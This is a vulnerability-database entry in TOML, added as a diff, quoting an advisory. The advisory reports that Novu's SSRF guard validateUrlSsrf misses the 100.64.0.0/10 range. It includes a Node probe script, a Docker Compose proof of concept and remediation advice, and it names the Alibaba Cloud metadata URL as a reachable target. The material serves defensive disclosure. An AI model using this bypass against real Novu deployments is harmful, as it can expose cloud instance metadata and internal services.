@@ -1,0 +1,324 @@
+[basic]
+description = '''
+Hi Novu team,
+
+Reporting an SSRF blocklist gap in the shared `validateUrlSsrf` guard. A complete self-contained reproduction is inlined below — copy the four files into a directory and run `docker compose up`, plus a single-file probe that runs against Node directly. Locally validated against HEAD `291817c`.
+
+## Summary
+
+Novu's shared SSRF guard `validateUrlSsrf(url)` is used before server-side requests to user-configured URLs. The guard resolves hostnames and blocks a regex list of private/reserved IP ranges, but it does not block `100.64.0.0/10` shared address space. As a result, Novu features protected by this guard can still send server-side requests to destinations such as `100.100.100.200` (Alibaba Cloud metadata service) and any other service reachable in `100.64.0.0/10`.
+
+## Affected code
+
+Guard:
+
+- `libs/application-generic/src/utils/ssrf-url-validation.ts`
+  - `isPrivateIp(...)` regex list at lines 9-28
+  - DNS resolution and address validation at lines 55-72
+
+Product call-sites:
+
+- Workflow HTTP request step: `apps/worker/src/app/workflow/usecases/send-message/execute-http-request-step.usecase.ts` — calls `validateUrlSsrf(url)` at line 149, then uses `HttpClientService` to send the request.
+- Webhook filter condition: `libs/application-generic/src/usecases/conditions-filter/conditions-filter.usecase.ts` — calls `validateUrlSsrf(child.webhookUrl)` at line 265, then sends `axios.post(child.webhookUrl, ...)` at line 277.
+
+HTTP client:
+
+- `libs/application-generic/src/services/http-client/http-client.service.ts` — uses `got(gotOptions)` at lines 120 and 142 after the preflight validation.
+
+## Root cause
+
+The SSRF guard uses a hand-written regex deny-list:
+
+```ts
+/^0\.0\.0\.0$/i,
+/^127\./,
+/^10\./,
+/^172\.(1[6-9]|2[0-9]|3[01])\./,
+/^192\.168\./,
+/^169\.254\./,
+/^::ffff:127\./i,
+/^::ffff:10\./i,
+/^::ffff:172\.(1[6-9]|2[0-9]|3[01])\./i,
+/^::ffff:192\.168\./i,
+/^::ffff:169\.254\./i,
+/^::1$/,
+/^fc00:/i,
+/^fe80:/i,
+```
+
+This list omits `100.64.0.0/10`, also called shared address space or CGNAT. These addresses are not RFC1918 private addresses, but they are also not normal public-internet destinations. Cloud and infrastructure providers commonly use special-use address ranges for metadata and internal services; **Alibaba Cloud metadata is available at `100.100.100.200`**.
+
+## Reproduction — Part 1: unit-level probe (no Docker required)
+
+Save the following file and run with `node novu_ssrf_guard_probe.js`. The script replicates `validateUrlSsrf` from `libs/application-generic/src/utils/ssrf-url-validation.ts` **verbatim** (the `isPrivateIp` regex list is copied as-is) and tests several URL categories.
+
+### `novu_ssrf_guard_probe.js`
+
+```javascript
+const dns = require('dns/promises');
+
+function isPrivateIp(ip) {
+  const privateRanges = [
+    /^0\.0\.0\.0$/i,
+    /^127\./,
+    /^10\./,
+    /^172\.(1[6-9]|2[0-9]|3[01])\./,
+    /^192\.168\./,
+    /^169\.254\./,
+    /^::ffff:127\./i,
+    /^::ffff:10\./i,
+    /^::ffff:172\.(1[6-9]|2[0-9]|3[01])\./i,
+    /^::ffff:192\.168\./i,
+    /^::ffff:169\.254\./i,
+    /^::1$/,
+    /^fc00:/i,
+    /^fe80:/i,
+  ];
+  return privateRanges.some((range) => range.test(ip));
+}
+
+async function validateUrlSsrf(url) {
+  let parsed;
+  try {
+    parsed = new URL(url);
+  } catch {
+    return 'Invalid URL format.';
+  }
+  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
+    return `URL scheme \"${parsed.protocol}\" is not allowed.`;
+  }
+  const hostname = parsed.hostname.toLowerCase();
+  const blockedHostnames = ['localhost', 'metadata.google.internal'];
+  if (blockedHostnames.includes(hostname)) {
+    return `Requests to \"${hostname}\" are not allowed.`;
+  }
+  let addresses;
+  try {
+    addresses = await dns.lookup(hostname, { all: true });
+  } catch {
+    return `Unable to resolve hostname \"${hostname}\".`;
+  }
+  for (const { address } of addresses) {
+    if (isPrivateIp(address)) {
+      return `Requests to private or reserved IP addresses are not allowed (resolved: ${address}).`;
+    }
+  }
+  return null;
+}
+
+async function main() {
+  for (const url of [
+    'http://127.0.0.1/',
+    'http://0.0.0.0/',
+    'http://0.0.0.1/',
+    'http://169.254.169.254/',
+    'http://100.64.0.1/',
+    'http://100.100.100.200/',
+    'http://224.0.0.1/',
+    'http://[fd00::1]/',
+    'http://[64:ff9b::7f00:1]/',
+    'http://[::ffff:100.64.0.1]/',
+    'http://8.8.8.8/',
+  ]) {
+    console.log(JSON.stringify({ url, verdict: (await validateUrlSsrf(url)) ?? 'ALLOW' }));
+  }
+}
+
+main().catch((e) => { console.error(e); process.exitCode = 1; });
+```
+
+### Expected output (relevant lines)
+
+```json
+{\"url\":\"http://127.0.0.1/\",\"verdict\":\"Requests to private or reserved IP addresses are not allowed (resolved: 127.0.0.1).\"}
+{\"url\":\"http://169.254.169.254/\",\"verdict\":\"Requests to private or reserved IP addresses are not allowed (resolved: 169.254.169.254).\"}
+{\"url\":\"http://100.64.0.1/\",\"verdict\":\"ALLOW\"}
+{\"url\":\"http://100.100.100.200/\",\"verdict\":\"ALLOW\"}
+{\"url\":\"http://8.8.8.8/\",\"verdict\":\"ALLOW\"}
+```
+
+The 2nd and 3rd `ALLOW` rows are the bypass — both are non-public destinations the guard should refuse.
+
+## Reproduction — Part 2: end-to-end Docker CGNAT proof
+
+Save the three files below into a directory, then:
+
+```bash
+docker compose up --abort-on-container-exit --exit-code-from novu-client
+```
+
+This mirrors the product sequence in `execute-http-request-step.usecase.ts`: resolve hostname → validate with `validateUrlSsrf` → send HTTP request. The \"target\" container is bound to a CGNAT address (`100.64.0.20`) on a custom subnet, simulando a cloud-internal service reachable on the CGNAT range.
+
+### `docker-compose.yml`
+
+```yaml
+services:
+  cgnat-target:
+    image: python:3.12-alpine
+    command: python -u /srv/target.py
+    volumes:
+      - ./target.py:/srv/target.py:ro
+    networks:
+      novu-cgnat:
+        ipv4_address: 100.64.0.20
+
+  novu-client:
+    image: node:22-alpine
+    command: node /srv/client.js
+    volumes:
+      - ./client.js:/srv/client.js:ro
+    depends_on:
+      - cgnat-target
+    networks:
+      novu-cgnat:
+        ipv4_address: 100.64.0.10
+
+networks:
+  novu-cgnat:
+    ipam:
+      config:
+        - subnet: 100.64.0.0/24
+```
+
+### `target.py`
+
+```python
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class Handler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        print(f\"[target] {self.client_address[0]} POST {self.path}\", flush=True)
+        self.send_response(200)
+        self.send_header(\"content-type\", \"application/json\")
+        self.end_headers()
+        self.wfile.write(b'{\"marker\":\"NOVU_CGNAT_SSRF_OK\"}\n')
+    def log_message(self, fmt, *args): return
+
+HTTPServer((\"100.64.0.20\", 8080), Handler).serve_forever()
+```
+
+### `client.js`
+
+```javascript
+const dns = require('dns/promises');
+
+function isPrivateIp(ip) {
+  const privateRanges = [
+    /^0\.0\.0\.0$/i, /^127\./, /^10\./,
+    /^172\.(1[6-9]|2[0-9]|3[01])\./, /^192\.168\./, /^169\.254\./,
+    /^::ffff:127\./i, /^::ffff:10\./i,
+    /^::ffff:172\.(1[6-9]|2[0-9]|3[01])\./i,
+    /^::ffff:192\.168\./i, /^::ffff:169\.254\./i,
+    /^::1$/, /^fc00:/i, /^fe80:/i,
+  ];
+  return privateRanges.some((range) => range.test(ip));
+}
+
+async function validateUrlSsrf(url) {
+  const parsed = new URL(url);
+  if (!['http:', 'https:'].includes(parsed.protocol)) return 'bad scheme';
+  if (['localhost', 'metadata.google.internal'].includes(parsed.hostname.toLowerCase())) {
+    return 'blocked hostname';
+  }
+  const addresses = await dns.lookup(parsed.hostname, { all: true });
+  for (const { address } of addresses) {
+    if (isPrivateIp(address)) return `blocked ${address}`;
+  }
+  return null;
+}
+
+async function waitForTarget(url) {
+  for (let attempt = 0; attempt < 20; attempt += 1) {
+    try {
+      const r = await fetch(url, { method: 'POST' });
+      await r.text();
+      return;
+    } catch (_e) {
+      await new Promise((resolve) => setTimeout(resolve, 250));
+    }
+  }
+}
+
+async function main() {
+  const url = 'http://cgnat-target:8080/workflow-http-step';
+  const addresses = await dns.lookup('cgnat-target', { all: true });
+  const validation = await validateUrlSsrf(url);
+  console.log(JSON.stringify({ url, addresses, validation: validation ?? 'ALLOW' }));
+
+  if (validation) { process.exitCode = 2; return; }
+
+  await waitForTarget(url);
+  const response = await fetch(url, {
+    method: 'POST',
+    headers: { 'content-type': 'application/json' },
+    body: JSON.stringify({ source: 'novu-http-request-step' }),
+  });
+  const body = await response.text();
+  console.log(JSON.stringify({ status: response.status, body }));
+}
+
+main().catch((e) => { console.error(e); process.exitCode = 1; });
+```
+
+### Expected output
+
+```
+novu-client-1   | {\"url\":\"http://cgnat-target:8080/workflow-http-step\",\"addresses\":[{\"address\":\"100.64.0.20\",\"family\":4}],\"validation\":\"ALLOW\"}
+cgnat-target-1  | [target] 100.64.0.10 POST /workflow-http-step
+novu-client-1   | {\"status\":200,\"body\":\"{\\"marker\\":\\"NOVU_CGNAT_SSRF_OK\\"}\n\"}
+```
+
+The chain is:
+
+1. Resolve hostname `cgnat-target` → `100.64.0.20` (a CGNAT address).
+2. Run Novu's `validateUrlSsrf` against the URL — returns `ALLOW` because `100.64.0.0/10` is missing from `isPrivateIp`.
+3. Send the actual server-side HTTP POST → reaches the CGNAT-bound target → response with marker `NOVU_CGNAT_SSRF_OK` is received.
+
+## Impact
+
+Any Novu feature that allows a user to configure an outbound HTTP URL and relies on `validateUrlSsrf` may still reach `100.64.0.0/10`. Impact is highest for:
+
+- **Alibaba Cloud deployments**, where `http://100.100.100.200/latest/meta-data/` may expose instance metadata.
+- **Self-hosted deployments** where `100.64.0.0/10` routes to private infrastructure, service meshes, VPNs, carrier-grade NAT, or provider-side internal services.
+- **Multi-tenant deployments** where one tenant can configure workflow HTTP request steps or webhook filters that execute from shared worker/API infrastructure — cross-tenant SSRF primitive into provider-internal services.
+
+## Suggested remediation
+
+- Replace regex matching with IP parsing and CIDR classification, e.g. using `ipaddr.js` with `process(...)` to normalize IPv4-mapped IPv6.
+- Treat only globally reachable public IPs as allowed by default (`addr.range() === 'unicast'` after IPv4-mapped unwrap, or equivalent).
+- Explicitly deny all special-use ranges, including at least:
+  - `0.0.0.0/8`, `10.0.0.0/8`, `100.64.0.0/10`, `127.0.0.0/8`, `169.254.0.0/16`, `172.16.0.0/12`, `192.168.0.0/16`
+  - multicast (`224.0.0.0/4`), documentation (`192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`, `2001:db8::/32`), benchmarking (`198.18.0.0/15`), reserved (`240.0.0.0/4`)
+  - IPv6 ULA (`fc00::/7`), link-local (`fe80::/10`), loopback (`::1`), and the IPv4-mapped variants of all of the above
+- Add regression tests for:
+  - `100.64.0.1`, `100.100.100.200`
+  - hostnames resolving to those addresses
+  - IPv4-mapped variants of denied IPv4 ranges (e.g., `::ffff:100.64.0.1`)
+- Consider connection-time validation or a guarded lookup agent so the actual request cannot resolve to a different IP than the preflight checked (DNS-rebinding TOCTOU mitigation).
+
+## Notes
+
+This report is intentionally scoped to the concrete `100.64.0.0/10` bypass. Additional missed ranges exist in the current regex guard (multicast `224.0.0.0/4`, broadcast `255.255.255.255`, benchmarking, documentation, `0.0.0.0/8` outside `/32`, and IPv4-mapped variants), but CGNAT is the highest-confidence real-world issue because it includes a known cloud metadata endpoint (`100.100.100.200` on Alibaba Cloud).
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "@novu/application-generic: `validateUrlSsrf` permits CGNAT (100.64.0.0/10) destinations — affects Workflow HTTP request step + Webhook filter condition"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-vg6v-j97m-h5xq"]
+ave_id = "AVE-2026-1215"
+
+[meta]
+collected_at = "2026-08-06T13:47:00.961776119+00:00"
+status = "completed"
+
+[references]
+urls = []
